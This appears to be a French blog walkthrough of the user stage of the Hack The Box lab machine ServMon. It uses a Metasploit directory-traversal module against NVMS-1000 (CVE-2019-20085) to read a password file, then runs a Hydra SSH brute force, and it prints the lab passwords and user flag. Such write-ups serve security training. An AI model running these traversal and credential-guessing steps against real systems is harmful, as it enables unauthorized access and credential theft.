---
layout: post
title: HTB - ServMon
subtitle: Hack The Box - Windows Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Windows, NVMS-1000, Directory Traversal, Metasploit, CVE-2019-20085, FTP, Hydra, SSH]
comments: false
---

## 1. User

~~~
root@host-001:~/bureau# nmap -sc -sv 10.10.10.184
starting nmap 7.80 ( https://nmap.org ) at 2020-04-29 07:17 cest
nmap scan report for 10.10.10.184
host is up (0.26s latency).
not shown: 991 closed ports
port     state service       version
21/tcp   open  ftp           microsoft ftpd
| ftp-anon: anonymous ftp login allowed (ftp code 230)
|_01-18-20  12:05pm       <dir>          users
| ftp-syst: 
|_  syst: windows_nt
22/tcp   open  ssh           openssh for_windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (rsa)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ecdsa)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ed25519)
80/tcp   open  http
| fingerprint-strings: 
|   fourohfourrequest: 
|     http/1.1 404 not found
|     content-type: text/html
|     content-length: 0
|     connection: close
|     authinfo:
|   genericlines, httpoptions, rtsprequest: 
|     http/1.1 200 ok
|     content-type: text/html
|     content-length: 340
|     connection: close
|     authinfo: 
|     <!doctype html public "-//w3c//dtd xhtml 1.0 transitional//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   getrequest: 
|     http/1.1 408 request timeout
|     content-type: text/html
|     content-length: 0
|     connection: close
|_    authinfo:
|_http-title: site doesn't have a title (text/html).
135/tcp  open  msrpc         microsoft windows rpc
139/tcp  open  netbios-ssn   microsoft windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   fourohfourrequest, httpoptions, rtsprequest, sipoptions: 
|     http/1.1 404
|     content-length: 18
|     document not found
|   getrequest: 
|     http/1.1 302
|     content-length: 0
|     location: /index.html
|     workers
|_    jobs
| http-title: nsclient++
|_requested resource was /index.html
| ssl-cert: subject: commonname=localhost
| not valid before: 2020-01-14t13:24:20
|_not valid after:  2021-01-13t13:24:20
|_ssl-date: tls randomness does not represent time
2 services unrecognized despite returning data. if you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============next service fingerprint (submit individually)==============
sf-port80-tcp:v=7.80%i=7%d=4/29%time=5ea90dfd%p=x86_64-pc-linux-gnu%r(getr
sf:equest,6b,"http/1\.1\x20408\x20request\x20timeout\r\ncontent-type:\x20t
sf:ext/html\r\ncontent-length:\x200\r\nconnection:\x20close\r\nauthinfo:\x
sf:20\r\n\r\n")%r(httpoptions,1b4,"http/1\.1\x20200\x20ok\r\ncontent-type:
sf:\x20text/html\r\ncontent-length:\x20340\r\nconnection:\x20close\r\nauth
sf:info:\x20\r\n\r\n\xef\xbb\xbf<!doctype\x20html\x20public\x20\"-//w3c//d
sf:td\x20xhtml\x201\.0\x20transitional//en\"\x20\"http://www\.w3\.org/tr/x
sf:html1/dtd/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://ww
sf:w\.w3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r
sf:\n\x20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\
sf:x20\x20\x20\x20\x20window\.location\.href\x20=\x20\"pages/login\.htm\";
sf:\r\n\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html
sf:>\r\n")%r(rtsprequest,1b4,"http/1\.1\x20200\x20ok\r\ncontent-type:\x20t
sf:ext/html\r\ncontent-length:\x20340\r\nconnection:\x20close\r\nauthinfo:
sf:\x20\r\n\r\n\xef\xbb\xbf<!doctype\x20html\x20public\x20\"-//w3c//dtd\x2
sf:0xhtml\x201\.0\x20transitional//en\"\x20\"http://www\.w3\.org/tr/xhtml1
sf:/dtd/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3
sf:\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x2
sf:0\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x
sf:20\x20\x20\x20window\.location\.href\x20=\x20\"pages/login\.htm\";\r\n\
sf:x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n
sf:")%r(fourohfourrequest,65,"http/1\.1\x20404\x20not\x20found\r\ncontent-
sf:type:\x20text/html\r\ncontent-length:\x200\r\nconnection:\x20close\r\na
sf:uthinfo:\x20\r\n\r\n")%r(genericlines,1b4,"http/1\.1\x20200\x20ok\r\nco
sf:ntent-type:\x20text/html\r\ncontent-length:\x20340\r\nconnection:\x20cl
sf:ose\r\nauthinfo:\x20\r\n\r\n\xef\xbb\xbf<!doctype\x20html\x20public\x20
sf:\"-//w3c//dtd\x20xhtml\x201\.0\x20transitional//en\"\x20\"http://www\.w
sf:3\.org/tr/xhtml1/dtd/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=
sf:\"http://www\.w3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title
sf:></title>\r\n\x20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x
sf:20\x20\x20\x20\x20\x20\x20\x20window\.location\.href\x20=\x20\"pages/lo
sf:gin\.htm\";\r\n\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body
sf:>\r\n</html>\r\n");
==============next service fingerprint (submit individually)==============
sf-port8443-tcp:v=7.80%t=ssl%i=7%d=4/29%time=5ea90e04%p=x86_64-pc-linux-gn
sf:u%r(getrequest,74,"http/1\.1\x20302\r\ncontent-length:\x200\r\nlocation
sf::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
sf:\0\0\0\0\0\0\x12\x02\x18\0\x1ae\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
sf:x18\xef\x03\x12")%r(httpoptions,36,"http/1\.1\x20404\r\ncontent-length:
sf:\x2018\r\n\r\ndocument\x20not\x20found")%r(fourohfourrequest,36,"http/1
sf:\.1\x20404\r\ncontent-length:\x2018\r\n\r\ndocument\x20not\x20found")%r
sf:(rtsprequest,36,"http/1\.1\x20404\r\ncontent-length:\x2018\r\n\r\ndocum
sf:ent\x20not\x20found")%r(sipoptions,36,"http/1\.1\x20404\r\ncontent-leng
sf:th:\x2018\r\n\r\ndocument\x20not\x20found");
service info: os: windows; cpe: cpe:/o:microsoft:windows

host script results:
|_clock-skew: 3m00s
| smb2-security-mode: 
|   2.02: 
|_    message signing enabled but not required
| smb2-time: 
|   date: 2020-04-29t05:22:42
|_  start_date: n/a

service detection performed. please report any incorrect results at https://nmap.org/submit/ .
nmap done: 1 ip address (1 host up) scanned in 157.93 seconds
root@host-001:~/bureau# 
~~~

smb ?

~~~
root@host-001:~/bureau# smbclient -l //10.10.10.184
enter workgroup\root's password: 
session setup failed: nt_status_access_denied
~~~

ftp ?

~~~
root@host-001:~/bureau# ftp 10.10.10.184
connected to 10.10.10.184.
220 microsoft ftp service
name (10.10.10.184:root): anonymous
331 anonymous access allowed, send identity (e-mail name) as password.
password:
230 user logged in.
remote system type is windows_nt.
ftp> dir *
200 port command successful.
125 data connection already open; transfer starting.
226 transfer complete.
ftp> dir
200 port command successful.
125 data connection already open; transfer starting.
01-18-20  12:05pm       <dir>          users
226 transfer complete.
ftp> dir /a
200 port command successful.
550 the system cannot find the file specified. 
ftp> quit
421 service not available, remote server has closed connection
~~~ 

Code source:

~~~
<meta http-equiv="X-UA-Compatible" content="IE=8" />
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>NVMS-1000</title>
	<!--common-->
	<link href="../Css/login.css?v=20150323.1" rel="stylesheet" type="text/css" />

	<script src="../Scripts/jquery-1.7.2.min.js?v=20150323.1" type="text/javascript"></script>

	<script src="../Scripts/Third/jquery.cookie.js?v=20150323.1" type="text/javascript"></script>

	<script src="../Scripts/Common/CommonFunctions.js?v=20150323.1" type="text/javascript"></script>

	<script src="../Scripts/Third/jquery.watermark.min.js?v=20150323.1" type="text/javascript"></script>

	<script src="../Scripts/Common/UnicodeAnsi.js" type="text/javascript"></script>

	<script src="../Scripts/Common/Base64.js?v=20150323.1" type="text/javascript"></script>

	<script src="../Scripts/Common/Encryption.js?v=20150323.1" type="text/javascript"></script>

	<script src="../Scripts/base.js?v=20150323.1" type="text/javascript"></script>

	<!--common-->

	<script src="../Scripts/login.htm.js?v=20150323.1" type="text/javascript"></script>
</head>
	<body>
		<div id="loadingIndicator" class="loading-indicator" style="">
		</div>
		<div id="Main">
			<div id="divLang">
				<div id="langType">
					<div id="langTypeSel">
					</div>
					<div id="langTypeArrow">
					</div>
					<div id="langTypeList">
					</div>
				</div>
			</div>
			<img id="mainBg" src="../Css/Pictures/Login/mainBg.png"/>
			<div id="mainBgMask"></div>
			<div id="webNameImg"></div>
			<div id="webName"></div>
			<div id="container">
				<div id="content">
					<input id="txtUserName" class="txt-input" type="text" name="userName" value="" />
					<input id="txtPassword" class="txt-input" type="password" name="password" value="" />
					<button id="btnLogin" lc="html" lk="login">
					</button>
					<div id="ErrorMsg">
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
~~~

Page d'accueil on parle de NVMS 1000.

{: .box-note}
**NVMS-1000** is a monitoring client specifically designed for network video surveillance. It allows you to control the video input signal devices such as cameras or domes, achieve live monitoring, video recording and backup by configuring the video parameters and viewing the live in the control panel. You can choose the menu to control the video surveillance system in the control panel. [https://en.freedownloadmanager.org/Windows-PC/NVMS-1000-FREE.html](https://en.freedownloadmanager.org/Windows-PC/NVMS-1000-FREE.html)

Code source scripts/login:

~~~
$(function () {
    //检测是否有登录会话，如果有，直接进入系统 == Vérifiez s'il y a une session de connexion, et si c'est le cas, accédez directement au système
    var auInfo = $.cookie('auInfo');
    if (auInfo) {
        window.location.href = "main.htm";
        return;
    }

	var webName = $("title").text();

	$("#webName").html(webName);

	if (webName == "NVMS-1000" || webName == "CMS") {
		$("#webName").hide();
		$("#webNameImg")[webName == "CMS" ? "addClass" : "removeClass"]("cms").show();
	} else {
		$("#webName").show();
		$("#webNameImg").hide();
	}

	$("#btnLogin").click(funLogin);
	$("#txtUserName,#txtPassword").keydown(function(ev) {
		ev = ev || event;
		if (isEnter(ev)) funLogin(ev);
	});
	$("#txtUserName").watermark(LangCtrl._L_("userName"));
	$("#txtPassword").watermark(LangCtrl._L_("password"));
	$("#btnLogin").focus();
	initLangCtrl();
});

function funLogin(e) {
    $("#btnLogin").attr("disabled", true).addClass("disabled");
	$("#ErrorMsg").html("");
	if (e && e.stopPropagation)
		e.stopPropagation();
	if (!funVerify()) {
	    $("#btnLogin").attr("disabled", false).removeClass("disabled");
		return;
	}
	var auInfo = zhBase64Encode($.trim($("#txtUserName").val()) + ":" + $("#txtPassword").val());
//	var auInfo = Encryption($.trim($("#txtUserName").val()) + ":" + $.trim($("#txtPassword").val()));
//	$.cookie('auInfo', auInfo);
//	window.location.href = "main.htm";
//	return;
	try {
		XmlHttpClient.SendHttpRequest({
			url: dataServiceBase + "doLogin",
			type: "POST",
			async: true,
			data: emptyRequest,
			checkCommonErrorSwitch: false,
			beforeSend: function(xhr) {
				xhr.setRequestHeader("Authorization", "Basic " + auInfo);
			},
			callback: function(result) {
				if ($("response>status", result).text() == "success") {
				    $.cookie('auInfo', auInfo);
				    $.cookie("userId", $("response>content>userId", result).text());
				    initSystemAuth(result);
					window.location.href = "main.htm";
				}
				else {
					$("#txtPassword").val("");
					var errorCode = $("response>errorCode", result).text();
					if (errorCode) {
					    switch (errorCode) {
					        case "536870947":
					        case "536870948":
					            $("#ErrorMsg").html(LangCtrl._L_("pwdError"));
					            break;
					        case "536870951":
					            $("#ErrorMsg").html(LangCtrl._L_("userLocked"));
					            break;
					        case "536870953":
					            $("#ErrorMsg").html(LangCtrl._L_("noRemoteLoginAuth"));
					            break;
					        default:
					            $("#ErrorMsg").html(LangCtrl._L_('loginFailed'));
						}
					}
					else
					    $("#ErrorMsg").html(LangCtrl._L_('loginFailed'));
					$("#btnLogin").attr("disabled", false).removeClass("disabled");
				}
			}
		});
	}
	catch (ex) {
		alert(ex);
	}
}

function funVerify() {
	if (!navigator.cookieEnabled) {
		$("#ErrorMsg").html(LangCtrl._L_("cookieDisabled"));
		return false;
	}
	else {
		$.cookie('testCookie', 'enable');
		if ($.cookie('testCookie') == "enable") {
			$.cookie('testCookie', null);
		}
		else {
			$("#ErrorMsg").html(LangCtrl._L_("cookieDisabled"));
			return false;
		}
	}
	if (!$.trim($("#txtUserName").val())) {
		$("#txtUserName").focus();
		$("#ErrorMsg").html(LangCtrl._L_("needUseName"));
		return false;
	}
	return true;
}

// 初始化权限 == Initialiser les autorisations
function initSystemAuth(xmlDoc) {
    var authMask = 0;
    $.each(systemAuthList, function (index, element) {
        if ($("response>content>systemAuth>" + element, xmlDoc).text() == "true") {
            authMask += Math.pow(2, index);
        }
    });
    $.cookie("authMask", authMask);
}
~~~

On traduit le chinois avec google translate :)

Exploit NVMS

~~~
root@Host-001:~/Bureau# searchsploit nvms
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
NVMS 1000 - Directory Traversal        | exploits/hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server A | exploits/multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buf | exploits/multiple/dos/32193.txt
--------------------------------------- ----------------------------------------
Shellcodes: No Result
root@Host-001:~/Bureau# 
~~~

Module dans Metasploit: [https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-20085](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-20085)

~~~
msf5 > use auxiliary/scanner/http/tvt_nvms_traversal
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > show actions

Auxiliary actions:

   Name  Description
   ----  -----------


msf5 auxiliary(scanner/http/tvt_nvms_traversal) > show options

Module options (auxiliary/scanner/http/tvt_nvms_traversal):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   DEPTH      13                yes       Depth for Path Traversal
   FILEPATH   /windows/win.ini  yes       The path to the file to read
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                yes       The target port (TCP)
   SSL        false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                 yes       The base URI path of nvms
   THREADS    1                 yes       The number of concurrent threads (max one per host)
   VHOST                        no        HTTP server virtual host

msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOST 10.10.10.184
RHOST => 10.10.10.184

msf5 auxiliary(scanner/http/tvt_nvms_traversal) > exploit

[+] 10.10.10.184:80 - Downloaded 92 bytes
[+] File saved in: /root/.msf4/loot/20200429085655_default_10.10.10.184_nvms.traversal_071142.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~

~~~
root@Host-001:~/Bureau/htb# cat /root/.msf4/loot/20200429085655_default_10.10.10.184_nvms.traversal_071142.txt
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
~~~

Exploit fonctionne maintenant faut trouver ou aller...

Selon nmap il y a un service ftp et on peut s'y connecter anonymement.

On se connecte anonymement mais on trouve rien...

On va quand même consulter dans firefox l'adresse: ftp://10.10.10.184

et on trouve un répertoire Users/ avec 2 sous répertoire /Nadine et /Nathan

Dans /Nadine: File:Confidential.txt

~~~
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
~~~

Dans /Nathan: 

~~~
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
~~~

On utilise l'exploit précédent pour télécharger le fichier passwords.txt sur le desktop de nathan:

~~~
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > show options

Module options (auxiliary/scanner/http/tvt_nvms_traversal):

   Name       Current Setting                      Required  Description
   ----       ---------------                      --------  -----------
   DEPTH      13                                   yes       Depth for Path Traversal
   FILEPATH   /users/nathan/desktop/Passwords.txt  yes       The path to the file to read
   Proxies                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.184                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                   yes       The target port (TCP)
   SSL        false                                no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                    yes       The base URI path of nvms
   THREADS    1                                    yes       The number of concurrent threads (max one per host)
   VHOST                                           no        HTTP server virtual host

msf5 auxiliary(scanner/http/tvt_nvms_traversal) > exploit

[+] 10.10.10.184:80 - Downloaded 156 bytes
[+] File saved in: /root/.msf4/loot/20200429131404_default_10.10.10.184_nvms.traversal_105512.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > quit
root@Host-001:~/Bureau# 

root@Host-001:~/Bureau# cat /root/.msf4/loot/20200429131404_default_10.10.10.184_nvms.traversal_105512.txt
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$root@Host-001:~/Bureau# 
~~~

On crée une liste Passwords.txt avec ces valeurs et une liste Users.txt basée sur les infos trouvées et on utilise hydra pour automatiser les connections ssh

~~~
root@Host-001:~/Bureau/htb/servmon# cat Passwords.txt 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$root@Host-001:~/Bureau/htb/servmon# vim Users.txt
root@Host-001:~/Bureau/htb/servmon# cat Users.txt 
Nadine
Nathan
nadine
nathan

root@Host-001:~/Bureau/htb/servmon# hydra -L Users.txt -P Passwords.txt 10.10.10.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-29 13:22:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:4/p:7), ~2 tries per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-29 13:22:16
~~~

On se connecte à ssh avec ces credentials: nadine::L1k3B1gBut7s@W0rk

~~~
root@Host-001:~/Bureau/htb/servmon# ssh nadine@10.10.10.184
The authenticity of host '10.10.10.184 (10.10.10.184)' can't be established.
ECDSA key fingerprint is SHA256:l00hI7FlitUwW9ndgFDHLzImSDNxQcjLOKxQPRmbzls.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.184' (ECDSA) to the list of known hosts.
nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine

08/04/2020  23:16    <DIR>          .
08/04/2020  23:16    <DIR>          ..
18/01/2020  11:23    <DIR>          3D Objects 
18/01/2020  11:23    <DIR>          Contacts   
08/04/2020  22:28    <DIR>          Desktop    
08/04/2020  22:28    <DIR>          Documents  
18/01/2020  11:23    <DIR>          Downloads  
08/04/2020  22:27    <DIR>          Favorites  
08/04/2020  22:27    <DIR>          Links      
18/01/2020  11:23    <DIR>          Music      
18/01/2020  11:31    <DIR>          OneDrive   
18/01/2020  11:23    <DIR>          Pictures   
18/01/2020  11:23    <DIR>          Saved Games
18/01/2020  11:23    <DIR>          Searches   
18/01/2020  11:23    <DIR>          Videos     
               0 File(s)              0 bytes
              15 Dir(s)  27,421,102,080 bytes free

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
29/04/2020  11:47                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,420,725,248 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
f18284f6f67c991c252be6af2a08af8b

nadine@SERVMON C:\Users\Nadine\Desktop>
~~~

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
